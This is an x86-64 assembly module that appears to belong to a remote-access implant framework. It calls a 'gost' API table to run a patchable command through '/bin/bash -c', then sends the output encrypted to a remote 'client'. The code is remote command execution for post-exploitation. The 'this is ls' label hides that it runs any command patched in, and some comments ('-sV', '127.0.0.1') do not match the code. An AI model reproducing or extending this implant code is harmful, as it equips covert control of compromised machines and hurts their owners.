;this is ls 
[BITS 64]

;api table documented on somewere

;base                   0 ;this help to calucate adress base + func RVA
;gostEncrypt            1 ;encrypt enything
;gostExecute            2 ;execute eny binary
;gostGetSyscall         3 ;get syscall number
;gostEXESyscall         4 ;execute syscall intruction
;gostPrint              5 ;print into client very secuer handle encryption internaly
;gostSend               6 ;this is same as gost print becouse gost print pointer to gostSend

;rax -> this is pointer to table structer 
;mov rbp,[rax + <index>*8]
;add rbp,[rax]
;call rbp

_start:

    xor r10, r10
    push r10                    ; NULL terminator (argv[3])
    
    lea r10, [rel user_cmd]
    push r10                    ; argv[2] = pointer to "-sV"
    
    lea r10, [rel dash_c] 
    push r10                    ; argv[1] = pointer to "127.0.0.1"
    
    lea r10, [rel bash_path]
    push r10                    ; argv[0] = pointer to program name
    

    lea r10,[rel bash_path]
    mov r13, rsp
    lea r14,[rel buf]
    mov rbp,[rax + 2*8]
    add rbp,[rax]
    push rax
    call rbp

    lea rdi,[rel buf]
    mov rcx,rax
    pop rax
    mov rbp,[rax + 5*8]
    add rbp,[rax]
    call rbp

	mov rax, 60         ; sys_exit syscall number
    xor rdi, rdi        ; exit code 0
    syscall


bash_path   db '/bin/bash', 0
dash_c      db '-c', 0
user_cmd:
    db "0xFFFFFFFF"
    times 40 db 0

buf: times 460 db 0
